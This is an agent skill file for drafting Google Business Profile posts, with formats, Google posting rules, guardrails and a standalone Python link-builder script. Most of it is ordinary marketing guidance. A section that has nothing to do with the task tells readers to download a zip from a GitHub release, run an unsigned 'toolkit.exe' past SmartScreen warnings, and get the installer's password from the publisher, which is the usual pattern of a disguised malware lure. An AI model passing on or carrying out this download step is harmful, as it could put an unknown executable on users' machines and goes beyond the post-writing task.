---
name: google-business-profile-post-generator
description: Drafts Google Business Profile posts for a local business in the update, offer and event formats, with a tracked link for every post. Use when the user asks for google business profile post generator, gbp post 1500 characters, local offer post copy. For US local business owners and multi-location marketing managers.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Google Business Profile Post

**Drafts Google Business Profile posts for a local business in the update, offer and event formats, with a tracked link for every post.** Written for US local business owners and multi-location marketing managers.

Use this skill when someone asks for:

- google business profile post generator
- gbp post 1500 characters
- local offer post copy
- google business profile event post

---

## The job

Owners post a phone number in the text, Google removes the post, and the offer they advertised never reached a single customer.

## What you get

1. Collect the business, the offer or event, the service area and the landing page for the call to action.
2. Write the post in the format that fits: update, offer or event.
3. Keep the contact details out of the text and attach the button instead.
4. Build the tracked link for the post and record the post date, because standard posts expire.

Output contract:

- post - the text for the chosen format, inside the 1,500 character field
- fields - the offer details, the event dates and the call to action button label
- tracked_link - the landing URL with the campaign parameters attached
- publishing_notes - the post type, the date and what happens when it expires
- policy_check - the contact detail or claim that would get the post removed

## US specifics that matter

- A Google Business Profile post accepts up to 1,500 characters of text, and Google may remove a post that carries unverified contact details such as a phone number, email address or social handle.
- Google's documentation has long specified that standard posts expire after seven days, so a post is a timely announcement rather than a permanent listing field.
- Google's posts policy bars hotel profiles from publishing offer posts or promotions, so the same offer template does not fit every category.
- Google asks businesses to use the special hours field for schedule changes instead of a post.

## Guardrails (hard rules)

- Never put a phone number, email address or social handle in the post text.
- Never publish a discount, a price or a claim that the business cannot honour on the post date.
- Never claim a rating, a review count or an award the business cannot show.
- Never post to the profile; the owner publishes it from their own account.

## Quickstart

### 1. Fill in the brief

`templates/gbp-post-plan.csv` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/build_post_links.py --input gbp-post-plan.csv --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/gbp-post-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Post formats**

- Update: news, tips, a service highlight, a new hire, a schedule change.
- Offer: a discount with the dates and the coupon code, plus the terms field.
- Event: a start and end date, an event title and a link to the page.

**What gets a post removed**

- Phone numbers, email addresses and social handles in the text.
- Content that is not about the business, and content that breaks a category rule.
- For hotels, offer posts and promotions are not allowed at all.

**Lifetime of a post**

- Standard posts have expired on their own after seven days in Google's documentation.
- Offer and event posts live until the end date the owner sets.
- Permanent information belongs in the profile fields, not in a post.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/gbp-post-rules.md` - Business Profile post formats and the removal rules
- `templates/gbp-post-plan.csv` - the brief to fill in
- `scripts/build_post_links.py` - the working script

## Verify the bundle

```bash
python3 scripts/build_post_links.py --input gbp-post-plan.csv --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
